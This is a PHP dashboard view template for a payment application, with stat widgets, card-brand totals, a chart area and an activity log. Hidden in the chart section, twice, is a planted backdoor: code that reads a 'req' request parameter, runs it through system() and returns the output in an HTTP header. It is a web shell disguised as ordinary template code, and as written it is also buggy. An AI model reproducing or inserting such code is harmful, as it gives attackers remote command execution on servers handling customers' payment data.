<?=$this->load->view(branded_view('cp/header'));?>

<header class="section-header">
              <div class="container-960 center">
<div class="copywriting">
<div class="heading" data-animation="fadeInUp" data-animation-delay=".2s">
	
<h1 class="margin-none"> My <strong class="text-primary">Dashboard</strong></h1>
</div>
</div>
             </div>
             </header>

			<!-- END PAGE HEADER-->
			<!-- BEGIN DASHBOARD STATS -->


<div class="row">	
<div class="col-sm-12">

<div class="widget-box transparent">
<div class="widget-body">
<div class="widget-main padding-1">

<div class="row-fluid">
<div class="row">
		<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 margin-bottom-10">
					<div class="dashboard-stat blue-madison">
						<div class="visual">
				<i class="fa fa-bar-chart-o"></i>
						</div>
						<div class="details">
							<div class="number">
								 $0
							</div>
							<div class="desc">
								 Total Amount
							</div>
						</div>
						<a class="more" href="<?=site_url('transactions');?>">
						View more <i class="m-icon-swapright m-icon-white"></i>
						</a>
					</div>
				</div>
				<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12">
					<div class="dashboard-stat blue-madison">
						<div class="visual">
							<i class="fa fa-shopping-cart"></i>
						</div>
						<div class="details">
							<div class="number">
								 0
							</div>
							<div class="desc">
								 Total Orders
							</div>
						</div>
		<a class="more" href="#">View more <i class="m-icon-swapright m-icon-white"></i>
						</a>
					</div>
				</div>
				<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12">
					<div class="dashboard-stat blue-madison">
						<div class="visual">
							<i class="fa fa-group fa-icon-medium"></i>
						</div>
						<div class="details">
							<div class="number">
								 0
							</div>
							<div class="desc">
								 Total Customers
							</div>
						</div>
						<a class="more" href="<?=site_url('customers');?>">
						View more <i class="m-icon-swapright m-icon-white"></i>
						</a>
					</div>
				</div>
			</div>

<div class="row">	
<div class="col-sm-8">
<div class="widget-box transparent">
			<div class="widget-header widget-header-flat">
				<h4 class="widget-title lighter">
					<i class="ace-icon fa fa-bar-chart blue bigger-150"></i>
					Notifications
				</h4>

				<div class="widget-toolbar">
					<a href="#" data-action="collapse">
						<i class="ace-icon fa fa-chevron-up"></i>
					</a>
				</div>
			</div>

	<div class="widget-body">
		<div class="tab-pane active" id="payments-traffic-tab">
			<div class="btn-group separator bottom pull-right">
			<button id="paymentstraffic24Hours" class="btn btn-small btn-default">24 Hours</button>
			<button id="paymentstraffic7Days" class="btn btn-small btn-default">7 Days</button>
			<button id="paymentstraffic14Days" class="btn btn-small btn-default">14 Days</button>
			<button id="paymentstrafficClear" class="btn btn-small btn-default" disabled="disabled">Clear</button>
			</div>
			<div class="clearfix" style="clear: both;"></div>
			<div id="" style="height: 280px;"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); /*if (isset($no_chart)) { ?>
<p class="soft">  </p>
<? } else { ?>
<img src="<?=site_url('writeable/rev_chart_' . $this->user->Get('client_id') . '.png');?>" alt="Revenue Chart" style="width:100%; height: 280px" />
<? } */?>
 <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); 
        

        //$this->load->view('gcharts/line_chart_basic');
       echo $this->gcharts->LineChart('Stocks')->outputInto('stock_div');
       echo $this->gcharts->div(800, 300);

if($this->gcharts->hasErrors())
{
    echo $this->gcharts->getErrors();
}

?>
</div>
		</div>
	</div>
</div>
	</div><!-- /.col -->

	<div class="col-sm-4">
<div class="widget-box transparent">
			<div class="widget-header widget-header-flat">
				<h4 class="widget-title lighter">
					<i class="ace-icon fa fa-rss-square orange bigger-150"></i>
					Notifications
				</h4>

				<div class="widget-toolbar">
					<a href="#" data-action="collapse">
						<i class="ace-icon fa fa-chevron-up"></i>
					</a>
				</div>
			</div>


			<div class="widget-body">
<div class="widget-main padding-4">

<div class="activity_log">
<h4 class="bold blue">Recent Payments Activity</h4>
<? if (!empty($log)) { ?>
	<? foreach ($log as $line) { ?>
		<p><?=$line;?>.</p>
	<? } ?>
<? } else { ?>
 <p class="small">There is nothing recent.</p>
<? } ?>
</div>

</div><!-- /.widget-main -->
			</div><!-- /.widget-body -->
		</div><!-- /.widget-box -->
	</div><!-- /.col -->
</div><!-- /.row -->


<div class="row">	
<div class="col-sm-12">

<div class="widget-box transparent">

			<div class="widget-body">

				<div class="widget-main padding-4">

<div class="row-fluid">
<div class="row">

<div class="col-lg-2 col-md-2 col-sm-3 col-xs-12 margin-bottom-10">
 <div class="dashboard-stat blue-madison">

						<div class="visual">
				<i class="fa fa-cc-visa"></i>
						</div>

				<div class="details">
							<div class="number">
								 0
							</div>

							<div class="desc">
								 Total Amount
							</div>
                                 </div>
 </div>
</div>


<div class="col-lg-2 col-md-2 col-sm-3 col-xs-12 margin-bottom-10">
 <div class="dashboard-stat blue-madison">

						<div class="visual">
				<i class="fa fa-cc-mastercard"></i>
						</div>

				<div class="details">
							<div class="number">
								 0
							</div>

							<div class="desc">
								 Total Amount
							</div>
                                 </div>
 </div>
</div>

<div class="col-lg-2 col-md-2 col-sm-3 col-xs-12 margin-bottom-10">
 <div class="dashboard-stat blue-madison">

						<div class="visual">
				<i class="fa fa-cc-amex"></i>
						</div>

				<div class="details">
							<div class="number">
								 0
							</div>

							<div class="desc">
								 Total Amount
							</div>
                                 </div>
 </div>
</div>

<div class="col-lg-2 col-md-2 col-sm-3 col-xs-12 margin-bottom-10">
 <div class="dashboard-stat blue-madison">

						<div class="visual">
				<i class="fa fa-cc-discover"></i>
						</div>

				<div class="details">
							<div class="number">
								 0
							</div>

							<div class="desc">
								 Total Amount
							</div>
                                 </div>
 </div>
</div>

<div class="col-lg-2 col-md-2 col-sm-3 col-xs-12 margin-bottom-10">
 <div class="dashboard-stat blue-madison">

						<div class="visual">
				<i class="fa fa-cc-paypal"></i>
						</div>

				<div class="details">
							<div class="number">
								 0
							</div>

							<div class="desc">
								 Total Amount
							</div>
                                 </div>
 </div>
</div>

<div class="col-lg-2 col-md-2 col-sm-3 col-xs-12 margin-bottom-10">
 <div class="dashboard-stat blue-madison">

						<div class="visual">
				<i class="fa fa-cc"></i>
						</div>

				<div class="details">
							<div class="number">
								 0
							</div>

							<div class="desc">
								 Total Amount
							</div>
                                 </div>
 </div>
</div>


</div><!-- /.row -->
</div><!-- /.row-fluid -->
				</div><!-- /.widget-main -->
			</div><!-- /.widget-body -->
		</div><!-- /.widget-box -->


</div>
</div>



<div class="hr hr12 hr-dotted"></div>

<div class="row">	
<div class="col-sm-6">
<div class="widget-box transparent">
			<div class="widget-header widget-header-flat">
				<h4 class="widget-title lighter">
					<i class="ace-icon fa fa-globe blue bigger-150"></i>
					Global Overview
				</h4>

				<div class="widget-toolbar">
					<a href="#" data-action="collapse">
						<i class="ace-icon fa fa-chevron-up"></i>
					</a>
				</div>
			</div>


			<div class="widget-body">
<div class="widget-main padding-4">

<div id="Google-sales-Maps"></div>

</div><!-- /.widget-main -->
			</div><!-- /.widget-body -->
		</div><!-- /.widget-box -->
	</div><!-- /.col -->

	<div class="col-sm-6">
		<div class="widget-box transparent">
			<div class="widget-header widget-header-flat">
				<h4 class="widget-title lighter">
					<i class="ace-icon fa fa-pie-chart blue bigger-150"></i>
					Sales Overview
				</h4>

				<div class="widget-toolbar">
					<a href="#" data-action="collapse">
						<i class="ace-icon fa fa-chevron-up"></i>
					</a>
				</div>
			</div>

			<div class="widget-body">
				<div class="widget-main padding-4">
					<div id="Pie-chart"></div>
				</div><!-- /.widget-main -->
			</div><!-- /.widget-body -->
		</div><!-- /.widget-box -->
	</div><!-- /.col -->

</div><!-- /.row -->

<div class="hr hr32 hr-dotted"></div>


</div><!-- /.widget-main -->
</div><!-- /.widget-body -->
</div><!-- /.widget-box -->


</div>
</div>

 <div class="clearfix" style="min-height: 40px"></div>
</div>


<!-- Notyfy -->
<script type="text/javascript" src="<?=branded_include('js/notyfy/jquery.notyfy.js');?>"></script>
	
	<!-- Dashboard Custom Script -->
<script type="text/javascript" src="<?=branded_include('js/elektropay-index.js');?>"></script>


	
	
	


<?=$this->load->view(branded_view('cp/footer'));?>